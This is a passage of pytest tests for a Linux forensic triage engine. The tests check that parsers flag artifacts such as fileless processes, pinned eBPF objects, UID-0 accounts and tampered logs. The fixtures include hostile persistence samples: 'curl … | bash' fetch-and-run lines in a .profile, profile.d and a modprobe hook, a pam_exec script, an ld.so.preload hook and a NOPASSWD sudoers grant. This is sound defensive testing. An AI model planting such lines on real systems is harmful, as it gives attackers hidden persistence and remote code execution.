    lin_kernel.run(_ctx(tmp_path, tmp_path / "CSVs"))
    out = (tmp_path / "CSVs" / "kernel_modules.csv").read_text(encoding="utf-8")
    assert "core_pattern,core_pattern,|/usr/lib/systemd/systemd-coredump %P %u %g," in out
    assert "systemd-coredump %P %u %g,yes" not in out          # standard handler not flagged


def test_handler_mdatp_health_threats_exclusions(tmp_path):
    sysd = tmp_path / "live_response" / "system"
    sysd.mkdir(parents=True)
    (sysd / "mdatp_health.txt").write_text(
        'healthy                : false\n'
        'real_time_protection_enabled : false\n'
        'app_version            : "101.26032.0000"\n', encoding="utf-8")
    (sysd / "mdatp_threat_list.txt").write_text("No threats.\n", encoding="utf-8")
    (sysd / "mdatp_threat_quarantine_list.txt").write_text("No threats.\n", encoding="utf-8")
    (sysd / "mdatp_exclusion_list.txt").write_text(
        "=====================================\n/tmp/.x\n", encoding="utf-8")

    p = ParserManifest(id="mdatp", requires=["live_response/system"],
                       handler="artifact_engine.handlers.lin_mdatp:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "mdatp.csv").read_text(encoding="utf-8")
    assert "health,healthy,false,yes" in out
    assert "health,real_time_protection_enabled,false,yes" in out
    assert "exclusion,,/tmp/.x,yes" in out
    assert "threat" not in out                                  # 'No threats.' -> no rows
    assert 'health,app_version,101.26032.0000,' in out


def test_handler_mdatp_skips_without_defender(tmp_path):
    (tmp_path / "live_response" / "system").mkdir(parents=True)
    p = ParserManifest(id="mdatp", requires=["live_response/system"],
                       handler="artifact_engine.handlers.lin_mdatp:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "skipped"
    assert not (tmp_path / "CSVs" / "mdatp.csv").exists()


def test_handler_services_and_timers(tmp_path):
    from artifact_engine.handlers import lin_services
    sysd = tmp_path / "live_response" / "system"
    sysd.mkdir(parents=True)
    (sysd / "systemctl_list-units.txt").write_text(
        "  UNIT                          LOAD      ACTIVE SUB     DESCRIPTION\n"
        "  ssh.service                   loaded    active running OpenBSD Secure Shell server\n"
        "* logrotate.service             loaded    failed failed  Rotate log files\n"
        "* old.service                   not-found inactive dead  old.service\n"
        "  apt-daily.timer               loaded    active waiting Daily apt download (failed retries)\n",
        encoding="utf-8")
    # NEXT and LAST hold spaces; ACTIVATES follows the .timer token.
    (sysd / "systemctl_list-timers_--all.txt").write_text(
        "NEXT                         LEFT        LAST                         PASSED       UNIT                    ACTIVATES\n"
        "Tue 2026-06-09 00:00:00 CEST 14h left    Mon 2026-06-08 00:00:00 CEST 9h ago       logrotate.timer         logrotate.service\n"
        "n/a                          n/a         n/a                          n/a          ua-timer.timer          ua-timer.service\n"
        "\n"
        "2 timers listed.\n", encoding="utf-8")

    lin_services.run(_ctx(tmp_path, tmp_path / "CSVs"))
    out = (tmp_path / "CSVs" / "services.csv").read_text(encoding="utf-8")
    assert "service,ssh.service,active/running,OpenBSD Secure Shell server," in out
    assert "service,logrotate.service,failed/failed,Rotate log files," in out   # surfaced, not flagged
    assert "service,old.service,inactive/dead,old.service,yes" in out           # not-found -> flagged
    assert "apt-daily.timer" not in out                                        # .timer in list-units ignored (only .service read there)
    assert "timer,logrotate.timer,Tue 2026-06-09 00:00:00 CEST,activates=logrotate.service," in out
    assert "timer,ua-timer.timer,n/a,activates=ua-timer.service," in out        # n/a next run handled


def test_handler_ebpf_groups_and_pins(tmp_path):
    sysd = tmp_path / "live_response" / "system"
    sysd.mkdir(parents=True)
    (sysd / "bpftool_prog_list.txt").write_text(
        "2: tracing  name hid_tail_call  tag 7cc47bbf  gpl\n"
        "\tloaded_at 2026-05-22T15:20:17+0200  uid 0\n"
        "\txlated 56B  jited 138B  memlock 4096B  map_ids 2\n"
        "44: kprobe  name __x64_sys_kill_enter  tag 0bbe66ae  gpl\n"
        "\tloaded_at 2026-05-22T15:20:35+0200  uid 0\n"
        "45: kprobe  name __x64_sys_kill_exit  tag a825db4b  gpl\n"
        "\tloaded_at 2026-05-22T15:20:35+0200  uid 0\n"
        "129304: kprobe  name sophos_setup_new_exec  tag f513bab3  gpl\n"
        "\tloaded_at 2026-03-12T14:24:17+0100  uid 465\n"
        "\tpids perf-sensor(20710)\n", encoding="utf-8")
    (sysd / "ls_-la_sys_fs_bpf.txt").write_text(
        "total 0\n"
        "drwx-----T 2 root root 0 May 22 14:50 .\n"
        "drwxr-xr-x 9 root root 0 May 22 14:50 ..\n"
        "-rw------- 1 root root 0 May 22 14:50 implant_map\n", encoding="utf-8")

    p = ParserManifest(id="ebpf", requires=["live_response/system"],
                       handler="artifact_engine.handlers.lin_ebpf:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "ebpf.csv").read_text(encoding="utf-8")
    assert "pin,implant_map,pinned object under /sys/fs/bpf (persists without loader),yes" in out
    assert "prog,kprobe,count=2 uid=0," in out                       # 2 root kprobes grouped
    assert "prog,kprobe,count=1 uid=465 loaded_by=perf-sensor," in out  # Sophos uid 465, not flagged
    assert "prog,tracing,count=1 uid=0," in out
    flagged = [ln for ln in out.splitlines() if ln.endswith(",yes")]
    assert flagged == ["pin,implant_map,pinned object under /sys/fs/bpf (persists without loader),yes"]  # only the pin


def test_handler_ebpf_skips_without_data(tmp_path):
    (tmp_path / "live_response" / "system").mkdir(parents=True)
    p = ParserManifest(id="ebpf", requires=["live_response/system"],
                       handler="artifact_engine.handlers.lin_ebpf:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "skipped"
    assert not (tmp_path / "CSVs" / "ebpf.csv").exists()


def test_handler_sessions_and_sockets(tmp_path):
    sysd = tmp_path / "live_response" / "system"
    sysd.mkdir(parents=True)
    (sysd / "who_-T.txt").write_text(
        "root     + pts/0        Mar 31 14:53 (203.0.113.32)\n"
        "administrador - tty1         Jun  8 08:14\n", encoding="utf-8")
    (sysd / "socket_files.txt").write_text(
        "/run/dbus/system_bus_socket\n"                            # standard -> skipped
        "/opt/Elastic/Agent/data/tmp/abc.sock\n"                   # nested 'tmp' -> skipped
        "/tmp/.X11-unix/X0\n"                                      # X11 -> skipped
        "/dev/shm/.implant.sock\n", encoding="utf-8")              # implant temp dir -> flagged

    p = ParserManifest(id="sessions", requires=["live_response/system"],
                       handler="artifact_engine.handlers.lin_sessions:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "sessions.csv").read_text(encoding="utf-8")
    assert "socket,/dev/shm/.implant.sock,unix socket in world-writable temp dir,yes" in out
    assert "system_bus_socket" not in out                         # standard socket skipped
    assert "Elastic" not in out                                   # nested tmp not matched on prefix
    assert "X11-unix" not in out                                  # X11 socket skipped
    assert "session,root,pts/0 from 203.0.113.32 at Mar 31 14:53," in out   # public IP not flagged
    assert "session,administrador,tty1 from local at Jun 8 08:14," in out     # local session, no host


def test_handler_sessions_skips_without_data(tmp_path):
    (tmp_path / "live_response" / "system").mkdir(parents=True)
    p = ParserManifest(id="sessions", requires=["live_response/system"],
                       handler="artifact_engine.handlers.lin_sessions:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "skipped"


def test_handler_known_hosts_lateral(tmp_path):
    from artifact_engine.handlers import lin_known_hosts
    rssh = tmp_path / "[root]" / "root" / ".ssh"
    rssh.mkdir(parents=True)
    (rssh / "known_hosts").write_text(
        "host01.example.local,10.0.0.22 ecdsa-sha2-nistp256 AAAAE2Vj...\n"   # same target,
        "host01.example.local,10.0.0.22 ssh-ed25519 AAAAC3Nz...\n"           # two keytypes -> 1 row
        "@revoked host02.example.local ssh-rsa AAAAB3Nz...\n", encoding="utf-8")
    ussh = tmp_path / "[root]" / "home" / "alice" / ".ssh"
    ussh.mkdir(parents=True)
    (ussh / "known_hosts").write_text(
        "|1|aaaa=|bbbb= ssh-ed25519 AAAAC3Nz...\n"                         # hashed -> summarised
        "|1|cccc=|dddd= ssh-rsa AAAAB3Nz...\n", encoding="utf-8")

    lin_known_hosts.run(_ctx(tmp_path, tmp_path / "CSVs"))
    out = (tmp_path / "CSVs" / "known_hosts.csv").read_text(encoding="utf-8")
    assert "root,\"host01.example.local,10.0.0.22\",\"ecdsa-sha2-nistp256,ssh-ed25519\",," in out  # deduped, keytypes collapsed
    assert "root,host02.example.local,ssh-rsa,@revoked," in out                  # marker captured
    assert "alice,(hashed),\"ssh-ed25519,ssh-rsa\",2 entries," in out      # hashed summarised per account


def test_handler_proc_anomalies(tmp_path):
    from artifact_engine.handlers import lin_proc_anomalies
    proc = tmp_path / "live_response" / "process"
    proc.mkdir(parents=True)
    (proc / "running_processes_full_paths.txt").write_text(
        "lrwxrwxrwx 1 root root 0 May 19 09:09 /proc/1/exe -> /lib/systemd/systemd\n"          # normal -> skip
        "lrwxrwxrwx 1 root root 0 May 19 09:09 /proc/10/exe\n"                                  # kernel thread -> skip
        "lrwxrwxrwx 1 root root 0 May 19 09:09 /proc/831/exe -> /usr/lib/jvm/java (deleted)\n"  # updated pkg -> skip
        "lrwxrwxrwx 1 sophos-spl-user sophos-spl-group 0 Mar 24 14:45 /proc/20710/exe -> /memfd:/sophos-subprocess-1-exec1 (deleted)\n"  # EDR -> skip
        "lrwxrwxrwx 1 ds ds 0 Jun 6 16:39 /proc/3456584/exe -> /memfd:a (deleted)\n"            # fileless -> flag
        "lrwxrwxrwx 1 root root 0 May 19 09:09 /proc/409/exe -> / (deleted)\n"                  # namespace artifact -> skip
        "lrwxrwxrwx 1 www-data www-data 0 May 19 09:09 /proc/5000/exe -> /tmp/.x/payload\n"     # temp exec + hidden -> flag+note
        "lrwxrwxrwx 1 root root 0 May 19 09:09 /proc/1011/exe -> /usr/sbin/cron\n",             # normal daemon, hidden -> skip (FP churn)
        encoding="utf-8")
    (proc / "ls_-l_proc_pid_cwd.txt").write_text(
        "lrwxrwxrwx 1 root root 0 May 19 09:13 /proc/1/cwd -> /\n"                              # normal -> skip
        "lrwxrwxrwx 1 www-data www-data 0 May 19 09:13 /proc/6000/cwd -> /dev/shm/.s\n"         # temp cwd -> flag
        "lrwxrwxrwx 1 root root 0 May 19 09:13 /proc/7000/cwd -> /tmp/gtic-336460/uac-3.1.0\n"  # collector (establishes root) -> skip
        "lrwxrwxrwx 1 root root 0 May 19 09:13 /proc/7001/cwd -> /tmp/gtic-336460\n",           # bare collector tag -> skip
        encoding="utf-8")
    (proc / "hidden_pids_for_ps_command.txt").write_text("5000\n1011\n99999\n", encoding="utf-8")

    lin_proc_anomalies.run(_ctx(tmp_path, tmp_path / "CSVs"))
    out = (tmp_path / "CSVs" / "proc_anomalies.csv").read_text(encoding="utf-8")
    assert "exe_memfd,3456584,ds,/memfd:a (deleted),yes" in out
    assert "exe_tmp,5000,www-data,/tmp/.x/payload [hidden from ps],yes" in out  # anomaly + hidden enrichment
    assert "cwd_tmp,6000,www-data,/dev/shm/.s,yes" in out
    assert "exe_deleted" not in out             # '/ (deleted)' namespace artifact not flagged
    assert "1011" not in out                    # hidden but normal daemon (worker churn) not flagged
    assert "20710" not in out                   # Sophos memfd excluded
    assert "/usr/lib/jvm/java" not in out       # deleted normal path (pkg update) excluded
    assert "gtic-336460" not in out             # UAC collector tree auto-detected and excluded
    assert "99999" not in out                   # transient hidden PID, no anomaly
    assert "systemd" not in out                 # normal exe not emitted


def test_handler_log_integrity(tmp_path):
    log = tmp_path / "[root]" / "var" / "log"
    (log / "audit").mkdir(parents=True)
    (log / "auth.log").write_text("Jan  1 sshd ...\n", encoding="utf-8")
    (log / "secure").write_text("", encoding="utf-8")          # emptied security log
    (log / "wtmp").write_bytes(b"\x00" * 384 * 2)              # 2 records, aligned
    (log / "btmp").write_bytes(b"\x00" * 100)                  # truncated (not x384)

    p = ParserManifest(id="log_integrity", requires=["[root]/var/log"],
                       handler="artifact_engine.handlers.lin_log_integrity:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "log_integrity.csv").read_text(encoding="utf-8")
    assert "secure,empty,0 bytes,yes" in out
    assert "btmp,truncated,100 bytes (not a multiple of 384),yes" in out
    assert "wtmp,present,768 bytes (2 records)," in out
    assert "auth.log,present," in out
    assert "messages,missing,," in out                          # missing not flagged


def test_handler_pkg_history_timeline_and_hacktools(tmp_path):
    log = tmp_path / "[root]" / "var" / "log"
    (log / "apt").mkdir(parents=True)
    (log / "zypp").mkdir(parents=True)
    (log / "apt" / "history.log").write_text(
        "Start-Date: 2026-01-01  10:00:00\n"
        "Commandline: apt install nmap\n"
        "Requested-By: alice (1000)\n"
        "Install: nmap:amd64 (7.80), libfoo:amd64 (1.0)\n"
        "End-Date: 2026-01-01  10:00:05\n", encoding="utf-8")
    (log / "dpkg.log").write_text(
        "2026-01-02 11:00:00 install socat:amd64 <none> 1.7\n"
        "2026-01-02 11:00:01 status installed socat:amd64 1.7\n", encoding="utf-8")
    (log / "zypp" / "history").write_text(
        "2026-01-03 12:00:00|install|htop|3.0|x86_64|root@h|repo|abc|\n", encoding="utf-8")
    (log / "dnf.rpm.log").write_text(
        "2026-01-04T13:00:00+0000 SUBDEBUG Installed: chisel-1.9.1.x86_64\n", encoding="utf-8")

    p = ParserManifest(id="pkg_history", requires=["[root]/var/log"],
                       handler="artifact_engine.handlers.lin_pkg_history:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "pkg_history.csv").read_text(encoding="utf-8")
    assert "2026-01-01 10:00:00,install,nmap,7.80,alice (1000),apt_history,yes" in out
    assert "install,libfoo,1.0,alice (1000),apt_history," in out   # benign, not flagged
    assert "2026-01-02 11:00:00,install,socat,1.7,,dpkg,yes" in out
    assert "status installed" not in out                            # dpkg status lines ignored
    assert "2026-01-03 12:00:00,install,htop,3.0,root@h,zypp," in out
    assert "install,chisel-1.9.1.x86_64,,,dnf_rpm,yes" in out


def test_handler_users_enriches_groups_shadow(tmp_path):
    etc = tmp_path / "[root]" / "etc"
    etc.mkdir(parents=True)
    (etc / "passwd").write_text(
        "root:x:0:0:root:/root:/bin/bash\n"
        "backdoor:x:0:0::/root:/bin/bash\n"
        "alice:x:1000:1000:Alice:/home/alice:/bin/bash\n"
        "svc:x:999:999::/var/svc:/bin/sh\n", encoding="utf-8")
    (etc / "group").write_text("root:x:0:\nsudo:x:27:alice\n", encoding="utf-8")
    (etc / "shadow").write_text(
        "root:$6$x$y:19000:0:99999:7:::\n"
        "alice:!:19000:0:99999:7:::\n"
        "svc::19000:0:99999:7:::\n", encoding="utf-8")

    p = ParserManifest(id="users", handler="artifact_engine.handlers.lin_users:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "users.csv").read_text(encoding="utf-8")
    assert "backdoor,0,0,root,,/bin/bash,,yes,,/root,yes" in out      # UID 0 non-root
    assert "alice,1000,1000,,sudo,/bin/bash,locked,yes,Alice,/home/alice," in out
    assert "svc,999,999,,,/bin/sh,no_password,,,/var/svc,yes" in out  # empty shadow pw
    assert "root,0,0,root,,/bin/bash,password_set,yes,root,/root," in out


def test_handler_cron_centralised(tmp_path):
    etc = tmp_path / "[root]" / "etc"
    (etc / "cron.d").mkdir(parents=True)
    (etc / "cron.daily").mkdir(parents=True)
    (etc / "crontab").write_text("*/5 * * * * root /usr/bin/foo\n", encoding="utf-8")
    (etc / "cron.d" / "evil").write_text("* * * * * root /tmp/x\n", encoding="utf-8")
    (etc / "cron.daily" / "backup").write_text("#!/bin/sh\nrsync ...\n", encoding="utf-8")
    (etc / "anacrontab").write_text("1 5 cron.daily run-parts /etc/cron.daily\n", encoding="utf-8")
    (etc / "cron.allow").write_text("root\n", encoding="utf-8")

    p = ParserManifest(id="cron", handler="artifact_engine.handlers.lin_cron:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "cron.csv").read_text(encoding="utf-8")
    assert "etc/crontab,*/5 * * * * root /usr/bin/foo" in out
    assert "etc/cron.d/evil,* * * * * root /tmp/x" in out
    assert "etc/cron.daily/backup,(periodic script)" in out
    assert "etc/anacrontab,1 5 cron.daily run-parts /etc/cron.daily" in out
    assert "etc/cron.allow,root" in out


def test_handler_netconfig_flags_sinkhole_and_redirect(tmp_path):
    etc = tmp_path / "[root]" / "etc"
    etc.mkdir(parents=True)
    (etc / "hosts").write_text(
        "127.0.0.1 localhost\n"
        "192.168.1.10 myhost\n"
        "0.0.0.0 security.ubuntu.com\n"
        "1.2.3.4 update.example.com\n", encoding="utf-8")
    (etc / "resolv.conf").write_text("nameserver 8.8.8.8\n", encoding="utf-8")
    (etc / "hosts.allow").write_text("ALL: ALL\n", encoding="utf-8")

    p = ParserManifest(id="netconfig", handler="artifact_engine.handlers.lin_netconfig:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "netconfig.csv").read_text(encoding="utf-8")
    assert "hosts,0.0.0.0 security.ubuntu.com,yes" in out      # sinkhole
    assert "hosts,1.2.3.4 update.example.com,yes" in out       # FQDN redirect
    assert "hosts,127.0.0.1 localhost," in out                 # not flagged
    assert "hosts,192.168.1.10 myhost," in out                 # bare name, not flagged
    assert "resolv.conf,nameserver 8.8.8.8," in out
    assert "hosts.allow,ALL: ALL,yes" in out


def test_handler_suid_flags_and_skips_snapshots(tmp_path):
    sysd = tmp_path / "live_response" / "system"
    sysd.mkdir(parents=True)
    (sysd / "suid.txt").write_text(
        "/usr/bin/sudo\n"                       # legitimately suid -> not flagged
        "/usr/bin/find\n"                       # GTFOBins
        "/tmp/rootbash\n"                       # unusual path
        "/usr/bin/.hidden\n"                    # hidden name
        "/.snapshots/107/snapshot/usr/bin/find\n",  # snapshot copy -> skipped
        encoding="utf-8")
    (sysd / "sgid.txt").write_text("/usr/bin/wall\n", encoding="utf-8")

    p = ParserManifest(id="suid", requires=["live_response/system"],
                       handler="artifact_engine.handlers.lin_suid:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "suid_sgid.csv").read_text(encoding="utf-8")
    assert "suid,/usr/bin/find,find,gtfobins,yes" in out
    assert "suid,/tmp/rootbash,rootbash,unusual_path,yes" in out
    assert "suid,/usr/bin/.hidden,.hidden,hidden_name,yes" in out
    assert "suid,/usr/bin/sudo,sudo,," in out          # legit suid present, unflagged
    assert "sgid,/usr/bin/wall,wall,," in out          # legit sgid present, unflagged
    assert "snapshot" not in out                       # btrfs copy skipped


def test_persistence_covers_service_account_homes(tmp_path):
    """/root + /home/* misses every SERVICE account, and those are where a web
    compromise persists: on Debian `www-data`'s home is /var/www, so a backdoor in
    /var/www/.profile -- which runs for any shell that account gets -- was invisible.
    Homes come from /etc/passwd, minus the placeholder ones (/, /nonexistent) whose
    scan would add the whole tree and no persistence location."""
    from artifact_engine.handlers import lin_persistence

    r = tmp_path / "[root]"
    (r / "etc").mkdir(parents=True)
    (r / "var" / "www").mkdir(parents=True)
    (r / "home" / "ana").mkdir(parents=True)
    (r / "etc" / "passwd").write_text(
        "root:x:0:0:root:/root:/bin/bash\n"
        "ana:x:1000:1000::/home/ana:/bin/bash\n"
        "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
        "daemon:x:1:1:daemon:/:/usr/sbin/nologin\n"          # '/' must not be scanned
        "nobody:x:65534:65534::/nonexistent:/usr/sbin/nologin\n",
        encoding="utf-8")
    (r / "var" / "www" / ".profile").write_text(
        "curl http://198.51.100.9/x.sh | bash\n", encoding="utf-8")
    (r / "home" / "ana" / ".bashrc").write_text("alias ll='ls -l'\n", encoding="utf-8")

    homes = {p.name for p in lin_persistence._homes(r)}
    assert "www" in homes and "ana" in homes
    assert r not in lin_persistence._homes(r)        # '/' rejected, not the whole tree

    out = tmp_path / "CSVs"
    lin_persistence.run(_ctx(tmp_path, out))
    text = (out / "persistence.csv").read_text(encoding="utf-8")
    assert "var/www/.profile" in text and "198.51.100.9" in text
    assert text.splitlines()[1].endswith(",yes")     # flagged, and sorted first


def test_handler_persistence(tmp_path):
    root = tmp_path / "[root]"
    etc_sys = root / "etc" / "systemd" / "system"
    etc_sys.mkdir(parents=True)
    (etc_sys / "evil.service").write_text(
        "[Service]\nExecStart=/tmp/.x/backdoor -c\n", encoding="utf-8")
    # Benign vendor unit -> excluded; suspicious vendor unit -> included.
    vendor = root / "usr" / "lib" / "systemd" / "system"
    vendor.mkdir(parents=True)
    (vendor / "ok.service").write_text(
        "[Service]\nExecStart=/usr/bin/sshd\n", encoding="utf-8")
    (vendor / "rogue.service").write_text(
        "[Service]\nExecStart=/bin/bash -i\n", encoding="utf-8")
    pd = root / "etc" / "profile.d"
    pd.mkdir(parents=True)
    (pd / "init.sh").write_text("export PATH=$PATH\ncurl http://x/y | bash\n", encoding="utf-8")
    (root / "etc" / "ld.so.preload").write_text("/dev/shm/hook.so\n", encoding="utf-8")
    # sudoers: NOPASSWD grant flagged, plain grant kept but not flagged.
    sudd = root / "etc" / "sudoers.d"
    sudd.mkdir(parents=True)
    (sudd / "evil").write_text("eviluser ALL=(ALL) NOPASSWD: ALL\n", encoding="utf-8")
    # PAM: pam_exec backdoor flagged, standard pam_unix not.
    pamd = root / "etc" / "pam.d"
    pamd.mkdir(parents=True)
    (pamd / "sshd").write_text(
        "auth required pam_unix.so\n"
        "auth optional pam_exec.so /tmp/.x/steal.sh\n", encoding="utf-8")
    # modprobe install hook running a command (not the /bin/true disable idiom).
    md = root / "etc" / "modprobe.d"
    md.mkdir(parents=True)
    (md / "evil.conf").write_text(
        "install evil /bin/sh -c 'curl http://x|sh'\ninstall safe /bin/true\n",
        encoding="utf-8")
    # APT post-invoke hook.
    aptd = root / "etc" / "apt" / "apt.conf.d"
    aptd.mkdir(parents=True)
    (aptd / "99evil").write_text('APT::Update::Post-Invoke {"/tmp/.x/run";};\n', encoding="utf-8")

    p = ParserManifest(id="persistence",
                       handler="artifact_engine.handlers.lin_persistence:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "ok"

    out = (tmp_path / "CSVs" / "persistence.csv").read_text(encoding="utf-8")
    assert "systemd_service,etc/systemd/system/evil.service,ExecStart=/tmp/.x/backdoor -c,yes" in out
    assert "ld_preload,etc/ld.so.preload,/dev/shm/hook.so,yes" in out
    assert "curl http://x/y | bash,yes" in out
    assert "rogue.service" in out                # suspicious vendor unit surfaced
    assert "ok.service" not in out               # benign vendor unit excluded
    assert "export PATH=$PATH" not in out        # benign profile line dropped (noise)
    assert "sudoers,etc/sudoers.d/evil,eviluser ALL=(ALL) NOPASSWD: ALL,yes" in out
    assert "pam,etc/pam.d/sshd,auth optional pam_exec.so /tmp/.x/steal.sh,yes" in out
    assert "pam_unix.so" not in out              # standard PAM module not flagged
    assert "install evil /bin/sh -c 'curl http://x|sh',yes" in out
    assert "install safe /bin/true,yes" not in out   # /bin/true disable idiom not flagged
    assert "pkg_hook,etc/apt/apt.conf.d/99evil" in out


_BENIGN = ('10.0.0.150 - - [19/May/2026:09:11:17 +0000] "GET /~dbw00/ HTTP/1.1" '
           '200 9036 "-" "check_http/v2.3.3"')
_JETPACK = ('1.1.1.1 - - [25/May/2026:00:04:34 +0200] "POST /bms/xmlrpc.php?for=jetpack'
            '&token=BA%26CO%2A%2A HTTP/1.1" 301 162 "-" "Jetpack by WordPress.com"')
_FILEMGR = ('10.0.0.150 - - [31/Mar/2026:03:32:28 +0000] "GET /t.php?dir=//var/www/html'
            '&action=edit HTTP/1.1" 200 4680 "-" "Mozilla/5.0"')


def test_handler_web_access_parses_apache_nginx_and_gz(tmp_path):
    import gzip

    ap = tmp_path / "[root]" / "var" / "log" / "apache2"
    ap.mkdir(parents=True)
    (ap / "access.log").write_text(_BENIGN + "\n" + _JETPACK + "\n", encoding="utf-8")
    with gzip.open(ap / "access.log.1.gz", "wt", encoding="utf-8") as fh:
        fh.write(_FILEMGR + "\n")
    # SUSE/RHEL underscore name + nginx per-vhost subdir
    ngx = tmp_path / "[root]" / "var" / "log" / "nginx" / "site"
    ngx.mkdir(parents=True)
    (ngx / "foo.access.log").write_text(
        '8.8.8.8 - - [01/Jun/2026:10:00:00 +0200] "GET /x HTTP/1.1" 200 5 "-" "curl"\n',
        encoding="utf-8")
    # error logs must NOT be picked up
    (ap / "error.log").write_text("nonsense not an access line\n", encoding="utf-8")

    p = ParserManifest(id="web_access",
                       handler="artifact_engine.handlers.lin_web_access:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "web_access.csv").read_text(encoding="utf-8")
    lines = out.splitlines()
    assert lines[0].startswith("time,ip,edge_ip,method,status")
    assert len(lines) == 1 + 4                       # 4 access lines across 3 files
    assert "2026-05-19 09:11:17 +0000,10.0.0.150,,GET,200" in out  # ISO time; no proxy -> empty edge_ip
    assert "8.8.8.8,,GET,200" in out                 # nginx vhost picked up
    assert "nonsense" not in out                     # error log excluded


def test_webcommon_xforwarded_for_recovers_client():
    """Behind a reverse proxy the connecting %h is the frontend; the real client
    is in a trailing X-Forwarded-For. `ip` must become the client and `edge_ip`
    the proxy; a spoof-proof tail-only search; junk/`-` falls back to %h."""
    from artifact_engine.handlers._webcommon import parse

    base = ('192.0.2.10 - - [19/Jul/2026:01:59:56 +0200] '
            '"GET /a HTTP/1.1" 301 - "-" "-"')
    # single client IP in a quoted XFF field
    rec = parse(base + ' X-Forwarded-For="198.51.100.7"')
    assert rec.ip == "198.51.100.7" and rec.edge_ip == "192.0.2.10"
    # XFF chain: leftmost (originating client) wins
    rec = parse(base + ' X-Forwarded-For="203.0.113.9, 10.0.0.1, 192.0.2.10"')
    assert rec.ip == "203.0.113.9" and rec.edge_ip == "192.0.2.10"
    # unusable XFF (`-`) -> fall back to the connecting host, edge_ip stays empty
    rec = parse(base + ' X-Forwarded-For="-"')
    assert rec.ip == "192.0.2.10" and rec.edge_ip == ""
    # no XFF at all -> connecting host is the client
    rec = parse(base)
    assert rec.ip == "192.0.2.10" and rec.edge_ip == ""
    # an XFF-looking string INSIDE the request URL must not hijack attribution
    rec = parse('192.0.2.10 - - [19/Jul/2026:01:59:56 +0200] '
                '"GET /x?h=X-Forwarded-For=203.0.113.99 HTTP/1.1" 200 5 "-" "curl"')
    assert rec.ip == "192.0.2.10" and rec.edge_ip == ""


def test_webcommon_parses_ssl_and_extra_fields_keeping_referer_ua():
    """SSL vhosts log %{SSL_PROTOCOL}x %{SSL_CIPHER}x (and others add %D %T)
    between the size and the "referer"/"ua" pair. Those extra unquoted fields must
    not cost us referer/UA -- UA-based detections (huntweb/web_sigma) depend on it,
    and HTTPS is where the interesting traffic usually is."""
    from artifact_engine.handlers._webcommon import parse

    # Apache SSL LogFormat: ... %b PROTO CIPHER "ref" "ua"  (here XFF="-" so %h is
    # already the real client)
    rec = parse('198.51.100.7 - - [21/Jul/2026:02:00:00 +0200] "GET /shell.php '
                'HTTP/1.1" 200 4495 TLSv1.2 ECDHE-RSA-AES256-GCM-SHA384 '
                '"https://ref.example/" "Mozilla/5.0 (iPhone)" X-Forwarded-For="-"')
    assert rec.ip == "198.51.100.7" and rec.edge_ip == ""
    assert rec.referer == "https://ref.example/"
    assert rec.ua == "Mozilla/5.0 (iPhone)"
    assert rec.path == "/shell.php" and rec.status == "200"

    # extra numeric fields (%D %T style "- -") before referer/ua, with XFF client
    rec = parse('192.0.2.20 - - [21/Jul/2026:02:00:00 +0200] "GET /a HTTP/1.1" '
                '301 242 - - "-" "curl" X-Forwarded-For="203.0.113.9"')
    assert rec.ip == "203.0.113.9" and rec.edge_ip == "192.0.2.20"
    assert rec.ua == "curl"


def test_cancel_all_escalates_to_kill():
    """terminate() is a REQUEST. A tool that blocks or ignores it used to survive
    Ctrl+C and keep reading the evidence after the engine had reported itself
    cancelled, so anything still alive after a grace period is killed outright."""
    import subprocess

    from artifact_engine.core import procs

    class _Stubborn:
        def __init__(self):
            self.terminated = self.killed = False

        def terminate(self):
            self.terminated = True

        def wait(self, timeout=None):
            raise subprocess.TimeoutExpired("cmd", timeout)   # ignores terminate

        def kill(self):
            self.killed = True

    class _Polite(_Stubborn):
        def wait(self, timeout=None):
            return 0                                          # exits on terminate

    stubborn, polite = _Stubborn(), _Polite()
    procs._active.update({stubborn, polite})
    try:
        procs.cancel_all()
    finally:
        procs._active.clear()
    assert stubborn.terminated and stubborn.killed      # escalated
    assert polite.terminated and not polite.killed      # left alone once it exited


def test_tools_lock_records_binaries_fetched_outside_the_manifests(tmp_path):
    """tools.lock.json is the audit trail of which tool builds produced the outputs.
    It walked the parser manifests only, so hayabusa -- a Python-handler parser with
    no `tool:` section, downloaded by `setup` itself -- was the one executable we run
    that went unrecorded, i.e. exactly what a "which version found this?" question
    asks about."""
    import json as _json

    from artifact_engine.cli import _write_tools_lock

    (tmp_path / "hayabusa").mkdir()
    (tmp_path / "hayabusa" / "hayabusa-3.9.0-win-x64.exe").write_bytes(b"MZ fake")
    _write_tools_lock(tmp_path, [])                 # no manifest tools at all

    lock = _json.loads((tmp_path / "tools.lock.json").read_text(encoding="utf-8"))
    entry = lock["hayabusa/hayabusa-3.9.0-win-x64.exe"]
    assert len(entry["sha256"]) == 64 and entry["size"] == 7
    assert "hayabusa" in entry["source"]


def test_web_metrics_bounds_its_accumulators_and_says_so(tmp_path, monkeypatch, caplog):
    """Everything per IP was already capped, but the top-level accumulators were not
